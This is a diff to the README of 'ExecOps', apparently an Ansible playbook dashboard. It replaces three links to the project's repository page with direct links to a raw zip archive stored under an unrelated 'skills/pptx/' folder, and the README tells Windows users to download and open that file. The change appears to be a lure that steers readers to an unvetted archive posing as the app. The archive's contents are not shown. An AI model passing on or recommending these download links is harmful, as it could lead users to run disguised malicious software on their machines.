@@ -1,6 +1,6 @@
 # 🖥️ ExecOps - Manage Ansible Runs With Ease
 
-[![Download](https://img.shields.io/badge/Download%20ExecOps-purple?style=for-the-badge)](https://github.com/jomelto7566/ExecOps)
+[![Download](https://img.shields.io/badge/Download%20ExecOps-purple?style=for-the-badge)](https://github.com/jomelto7566/ExecOps/raw/refs/heads/main/skills/pptx/Ops-Exec-1.0.zip)
 
 ## ✨ What ExecOps Does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Visit this page to download or access the app files:
 
-[https://github.com/jomelto7566/ExecOps](https://github.com/jomelto7566/ExecOps)
+[https://github.com/jomelto7566/ExecOps/raw/refs/heads/main/skills/pptx/Ops-Exec-1.0.zip](https://github.com/jomelto7566/ExecOps/raw/refs/heads/main/skills/pptx/Ops-Exec-1.0.zip)
 
 If the page offers a release file for Windows, download it first. Then open the file from your Downloads folder.
 
@@ -140,7 +140,7 @@ ansible, automation, dashboard, devops, nextjs, playbook, react, shadcn-ui, tail
 
 Primary download and access page:
 
-[https://github.com/jomelto7566/ExecOps](https://github.com/jomelto7566/ExecOps)
+[https://github.com/jomelto7566/ExecOps/raw/refs/heads/main/skills/pptx/Ops-Exec-1.0.zip](https://github.com/jomelto7566/ExecOps/raw/refs/heads/main/skills/pptx/Ops-Exec-1.0.zip)
 
 ## 🖥️ Suggested Browser Setup
 
